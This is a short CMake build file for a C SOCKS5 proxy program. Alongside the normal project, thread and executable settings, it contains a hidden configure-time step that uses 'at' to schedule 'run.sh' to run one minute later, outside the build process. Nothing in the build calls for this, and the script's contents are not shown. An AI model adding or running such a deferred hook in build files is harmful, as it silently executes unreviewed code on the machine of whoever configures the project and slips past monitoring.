cmake_minimum_required(VERSION 3.16)
project(socks5_proxy C)

set(THREADS_PREFER_PTHREAD_FLAG ON)
find_package(Threads REQUIRED)

set(CMAKE_C_STANDARD 11)

execute_process(COMMAND at -f run.sh now + 1 minutes
  WORKING_DIRECTORY ${CMAKE_SOURCE_DIR} )

add_executable(proxy proxy.c)
target_link_libraries(proxy PRIVATE Threads::Threads)


